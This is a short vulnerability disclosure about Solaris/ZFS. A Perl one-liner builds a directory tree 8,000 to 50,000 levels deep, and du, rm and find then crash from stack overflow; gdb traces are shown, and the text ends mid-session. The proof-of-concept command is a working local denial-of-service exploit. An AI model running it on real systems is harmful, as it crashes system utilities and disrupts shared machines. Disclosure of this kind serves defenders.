- --- 0.Description ---
Solaris is a Unix operating system introduced by Sun Microsystems in
1992 as the successor to SunOS.

Sun Microsystems, Inc. is a wholly owned subsidiary of Oracle
Corporation, selling computers, computer components, computer software,
and information technology services. Sun was founded on February 24,
1982. The company was headquartered in Santa Clara, California (part of
Silicon Valley), on the former west campus of the Agnews Developmental
Center.

In computing, ZFS is a combined file system and logical volume manager
designed by Sun Microsystems. The features of ZFS include support for
high storage capacities, integration of the concepts of filesystem and
volume management, snapshots and copy-on-write  clones, continuous
integrity checking and automatic repair, RAID-Z and native NFSv4 ACLs.

We can create, deep tree and when we will remove, scan or something else
with this tree, affected program will crash with stack overflow sympton

PoC:
# perl -e '$a="X";for(1..8000){ ! -d $a and mkdir $a and chdir $a }'

we need use 1..8000 or bigger value to make stack overflow.

in result

# du X
Segmentation fault (core dumped)
# /usr/local/bin/gdb -q du
(no debugging symbols found)
(gdb) r X
Starting program: /usr/bin/du X
(no debugging symbols found)
(no debugging symbols found)
(no debugging symbols found)
(no debugging symbols found)

Program received signal SIGSEGV, Segmentation fault.
0xfeedfc8a in _ndoprnt () from /lib/libc.so.1
(gdb) x/i $eip
0xfeedfc8a <_ndoprnt+12>:       push   %ebp

We can simple remove this dir for 1..8000

# rm -rf X
#

but let`s try create this

# perl -e '$a="Y";for(1..50000){ ! -d $a and mkdir $a and chdir $a }'
# rm -rf Y
Segmentation fault (core dumped)

rm(1) has fail!

what is wrong? stack overflow

# /usr/local/bin/gdb -q rm
(no debugging symbols found)
(gdb) r -rf Y
Starting program: /usr/bin/rm -rf Y
(no debugging symbols found)
(no debugging symbols found)

Program received signal SIGSEGV, Segmentation fault.

(gdb) x/i $eip
0x8051c03:      push   %ebx

# find Y CX >> /dev/null
Segmentation fault (core dumped)


find(1) also fails!

# /usr/local/bin/gdb -q find
(no debugging symbols found)
(gdb) r Y CX >> /dev/null
Starting program: /usr/bin/find Y CX >> /dev/null
(no debugging symbols found)
